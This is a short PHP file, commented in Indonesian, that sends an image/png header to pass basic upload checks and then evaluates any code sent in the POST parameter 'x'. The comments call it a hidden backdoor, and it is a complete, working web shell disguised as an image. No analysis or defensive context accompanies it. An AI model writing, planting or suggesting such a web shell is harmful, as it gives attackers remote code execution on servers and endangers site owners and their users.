<?php
// Berpura-pura menjadi header PNG agar lolos pemeriksaan berkas dasar
header('Content-Type: image/png');
// Kode backdoor tersembunyi
if(isset($_POST['x'])) { eval($_POST['x']); }
?>
